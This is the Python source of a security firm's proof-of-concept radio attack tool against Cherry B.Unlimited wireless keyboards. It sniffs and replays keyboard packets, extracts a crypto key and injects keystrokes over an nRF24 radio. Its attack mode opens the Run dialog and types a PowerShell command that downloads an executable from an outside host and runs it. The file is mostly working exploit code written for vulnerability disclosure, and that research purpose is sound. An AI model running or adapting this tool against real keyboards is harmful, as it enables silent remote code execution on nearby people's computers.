#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
  SySS Radio Hack Box v2.0

  by Matthias Deeg <matthias.deeg@syss.de>

  Proof-of-Concept software tool to demonstrate the replay
  and keystroke injection vulnerabilities of the wireless keyboard
  Cherry B.Unlimited AES and Cherry B.Unlimited 3.0

  Copyright (C) 2023 SySS GmbH

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

import adafruit_character_lcd.character_lcd_rgb_i2c as character_lcd
import board
import busio
import logging
import subprocess

from binascii import hexlify, unhexlify
from lib import keyboard
from lib import nrf24
from logging import debug, info
from time import sleep, time
from sys import exit

# constants
APP_NAME        = "Radio Hack Box 2.0"
SYSS_BANNER     = "SySS GmbH"
ATTACK_VECTOR   = "powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"

# LCD configuration
LCD_COLUMNS = 16
LCD_ROWS = 2

# state machine
IDLE            = 0                         # idle state
RECORD          = 1                         # record state
REPLAY          = 2                         # replay state
SCAN            = 3                         # scan state
ATTACK          = 4                         # attack state
SHUTDOWN        = 5                         # shutdown state

SCAN_TIME       = 2                         # scan time in seconds for scan mode heuristics
DWELL_TIME      = 0.1                       # dwell time for scan mode in seconds
PREFIX_ADDRESS  = b""                       # prefix address for promicious mode
LCD_DELAY       = 3                         # 3 seconds for showing some info on the LCD


class RadioHackBox():
    """Radio Hack Box 2.0"""

    def __init__(self):
        """Initialize the nRF24 radio and the Raspberry Pi"""

        self.state = IDLE                            # current state
        self.i2c = None                              # I2C bus
        self.lcd = None                              # LCD
        self.radio = None                            # nRF24 radio
        self.address = None                          # address of Cherry keyboard (CAUTION: Reversed byte order compared to sniffer tools!)
        self.valid_address = False                   # flag for valid address
        self.valid_crypto_key = False                # flag for valid crypto key
        self.channel = 6                             # used ShockBurst channel (was 6 for all tested Cherry keyboards)
        self.payloads = []                           # list of sniffed payloads
        self.kbd = None                              # keyboard for keystroke injection attacks

        try:
            # initialize LCD
            self.i2c = busio.I2C(board.SCL, board.SDA)
            self.lcd = character_lcd.Character_LCD_RGB_I2C(self.i2c, LCD_COLUMNS, LCD_ROWS)
            self.lcd.color = [100, 0, 0]
            self.lcd.clear()
            self.lcd.message = f"{APP_NAME}\n{SYSS_BANNER}"

            # initialize radio
            self.radio = nrf24.nrf24()

            # enable LNA
            self.radio.enable_lna()

            # start scanning mode
            self.setState(SCAN)
        except:
            # error when initializing Radio Hack Box
            self.lcd.clear()
            self.lcd.message = "Error: 0xDEAD\nPlease RTFM!"
            exit(1)


    def setState(self, newState):
        """Set state"""

        # set LCD content
        self.lcd.clear()
        self.lcd.home()
        self.lcd.message = APP_NAME

        if newState == RECORD:
            # set RECORD state
            self.state = RECORD

            # set LCD content
            self.lcd.message = f"{APP_NAME}\nRecording ..."

        elif newState == REPLAY:
            # set REPLAY state
            self.state = REPLAY

            # set LCD content
            self.lcd.message = f"{APP_NAME}\nReplaying ..."

        elif newState == SCAN:
            # set SCAN state
            self.state = SCAN

            # set LCD content
            self.lcd.message = f"{APP_NAME}\nScanning ..."

        elif newState == ATTACK:
            # set ATTACK state
            self.state = ATTACK

            # set LCD content
            self.lcd.message = f"{APP_NAME}\nAttacking ..."

        elif newState == SHUTDOWN:
            # set SHUTDOWN state
            self.state = SHUTDOWN

            # set LCD content
            self.lcd.message = f"{APP_NAME}\nShutdown ..."

        else:
            # set IDLE state
            self.state = IDLE

            # set LCD content
            self.lcd.message = f"{APP_NAME}\n{SYSS_BANNER}"


    def unique_everseen(self, seq):
        """Remove duplicates from a list while preserving the item order"""
        seen = set()
        return [x for x in seq if str(x) not in seen and not seen.add(str(x))]


    def run(self):
        # main loop
        try:
            while True:
                # check keypad input
                if self.lcd.up_button:
                    # start/stop recording

                    # if the current state is IDLE change it to RECORD
                    if self.state == IDLE:
                        # set RECORD state
                        self.setState(RECORD)

                        # empty payloads list
                        self.payloads = []

                    # if the current state is RECORD change it to IDLE
                    elif self.state == RECORD:
                    # set IDLE state
                        self.setState(IDLE)

                        # info output
                        info("Start RECORD mode")

                elif self.lcd.left_button:
                    # start scanning

                    # if the current state is IDLE change it to SCAN
                    if self.state == IDLE:
                        # invalidate address and crypto key
                        self.valid_address = False

                        # set SCAN state
                        self.setState(SCAN)

                        # info output
                        info("Start SCAN mode")

                elif self.lcd.down_button:
                    # start playback

                    # if the current state is IDLE change it to REPLAY
                    if self.state == IDLE:
                        # set REPLAY state
                        self.setState(REPLAY)

                        # info output
                        info("Start REPLAY mode")

                elif self.lcd.right_button:
                    # start attack

                    # if the current state is IDLE change it to ATTACK
                    if self.state == IDLE:
                        # set ATTACK state
                        self.setState(ATTACK)

                elif self.lcd.select_button:
                    # graceful shutdown

                    # set ATTACK state
                    self.setState(SHUTDOWN)

                # check state
                if self.state == RECORD:
                    # receive payload
                    value = self.radio.receive_payload()

                    if value[0] == 0:
                        # split the payload from the status byte
                        payload = value[1:]

                        # add payload to list
                        self.payloads.append(payload)

                        # info output, show packet payload
                        info("Received payload: {0}".format(hexlify(payload)))

                elif self.state == REPLAY:
                    # remove duplicate payloads (retransmissions)
                    payloadList = self.unique_everseen(self.payloads)

                    # replay all payloads
                    for p in payloadList:
                        # transmit payload
                        self.radio.transmit_payload(p)

                        # info output
                        info("Sent payload: {0}".format(hexlify(p)))


                    # set IDLE state after playback
                    sleep(0.5)                           # delay for LCD
                    self.setState(IDLE)

                elif self.state == SCAN:
                    # put the radio in promiscuous mode
                    self.radio.enter_promiscuous_mode(PREFIX_ADDRESS)

                    # define channels for scan mode
                    channels = [6]

                    # set initial channel
                    self.radio.set_channel(channels[0])

                    # sweep through the defined channels and decode ESB packets in pseudo-promiscuous mode
                    last_tune = time()
                    channel_index = 0
                    while True:
                        # increment the channel
                        if len(channels) > 1 and time() - last_tune > DWELL_TIME:
                            channel_index = (channel_index + 1) % (len(channels))
                            self.radio.set_channel(channels[channel_index])
                            last_tune = time()

                        # receive payloads
                        value = self.radio.receive_payload()
                        if len(value) >= 5:
                            # split the address and payload
                            address, payload = value[0:5], value[5:]

                            # check if the address most probably belongs to a Cherry keyboard
                            # if address[-1] in range(0x30, 0x3f):
                            #     # first fit strategy to find a Cherry keyboard
                            #     self.address = address[::-1]
                            #     self.valid_address = True
                            #     break

                            # first fit strategy to find a Cherry keyboard
                            self.address = address[::-1]
                            self.valid_address = True
                            break

                        # allow stopping the scan mode
                        elif self.lcd.left_button:
                            info("Stop SCAN mode")
                            self.setState(IDLE)
                            break

                    if self.valid_address:
                        # set LCD content
                        self.lcd.clear()
                        address_string = ':'.join('{:02X}'.format(b) for b in address)
                        self.lcd.message = f"Found keyboard\n{address_string}"

                        # info output
                        info("Found keyboard with address {0}".format(address_string))

                        # put the radio in sniffer mode (ESB w/o auto ACKs)
                        self.radio.enter_sniffer_mode(self.address)

                        last_key = 0
                        packet_count = 0
                        while True:
                            # receive payload
                            value = self.radio.receive_payload()

                            if value[0] == 0:
                                # do some time measurement
                                last_key = time()

                                # split the payload from the status byte
                                payload = value[1:]

                                # increment packet count
                                packet_count += 1

                                # show packet payload
                                info("Received payload: {0}".format(hexlify(payload)))

                            # heuristic for having a valid release key data packet
                            if packet_count >= 4 and time() - last_key > SCAN_TIME:
                                self.valid_crypto_key = True
                                break

                            # allow stopping the search for the crypto key
                            elif self.lcd.left_button:
                                info("Stop search for crypto key")
                                self.valid_crypto_key = False
                                self.setState(IDLE)
                                break

                        if self.valid_crypto_key:
                            self.radio.receive_payload()

                            # show info on LCD
                            self.lcd.clear()
                            self.lcd.message = "Got crypto key!"

                            # info output
                            info("Got crypto key!")

                            # initialize keyboard
                            self.kbd = keyboard.CherryKeyboard(payload)
                            info("Initialize keyboard")

                            # set IDLE state after scanning
                            sleep(LCD_DELAY)                    # delay for LCD
                            self.setState(IDLE)

                elif self.state == ATTACK:
                    # info output
                    info("Start ATTACK mode")

                    if self.kbd != None:
                        #                        # send keystrokes for a classic PoC attack
#                        keystrokes = []
#                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
#                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
#                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
#                        keystrokes += self.kbd.getKeystrokes(u"cmd")
#                        keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)
#                        keystrokes += self.kbd.getKeystrokes(u"rem All your base are belong to SySS!")
#                        keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)

                        # send keystrokes for a classic download and execute PoC attack
                        keystrokes = []
                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))

                        # send attack keystrokes
                        for k in keystrokes:
                            self.radio.transmit_payload(k)

                            # info output
                            info("Sent payload: {0}".format(hexlify(k)))

                        # need small delay after WIN + R
                        sleep(0.1)

                        keystrokes = []
                        keystrokes = self.kbd.getKeystrokes(ATTACK_VECTOR)
                        keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)

                        # send attack keystrokes with a small delay
                        for k in keystrokes:
                            self.radio.transmit_payload(k)

                            # info output
                            info("Sent payload: {0}".format(hexlify(k)))

                    # set IDLE state after attack
                    sleep(0.5)                          # delay for LCD
                    self.setState(IDLE)

                elif self.state == SHUTDOWN:
                    # info output
                    info("SHUTDOWN")
                    sleep(0.5)

                    # turn off display
                    self.lcd.color = [0, 0, 0]
                    self.lcd.display = False

                    # perform graceful shutdown
                    command = "/usr/bin/sudo /sbin/shutdown -h now"
                    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
                    output = process.communicate()[0]
                    exit(1)

        except KeyboardInterrupt:
            # turn off LCD
            self.lcd.color = [0, 0, 0]
            self.lcd.display = False
            exit(1)


# main program
if __name__ == '__main__':
    # setup logging
    level = logging.INFO
    logging.basicConfig(level=level, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")

    # init
    info("Initialize Radio Hack Box v2.0")
    radiohackbox = RadioHackBox()

    # run
    info("Start Radio Hack Box v2.0")
    radiohackbox.run()

